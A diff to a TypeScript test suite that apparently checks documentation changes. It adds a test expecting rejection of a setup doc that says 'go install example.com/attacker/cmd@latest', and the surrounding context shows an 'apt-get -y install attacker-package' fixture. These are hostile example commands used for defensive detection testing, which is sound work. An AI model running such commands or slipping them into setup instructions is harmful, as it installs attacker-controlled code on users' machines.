@@ -189,6 +189,15 @@ export function registerCloudNonsensitiveSourceBehaviorTests(): void {
       expect(secondResult.stderr).toContain("install-command");
     });
 
+    it("rejects version-suffixed remote go install/run", () => {
+      const { root, base } = fixture();
+      write(root, "docs/setup.md", "Then go install example.com/attacker/cmd@latest\n");
+      const target = commitAll(root, "go install remote");
+      const result = run(root, base, target);
+      expect(result.status).toBe(1);
+      expect(result.stderr).toContain("install-command");
+    });
+
     it("rejects install subcommands behind intervening options", () => {
       const { root, base } = fixture();
       write(root, "docs/setup.md", "Then apt-get -y install attacker-package\n");
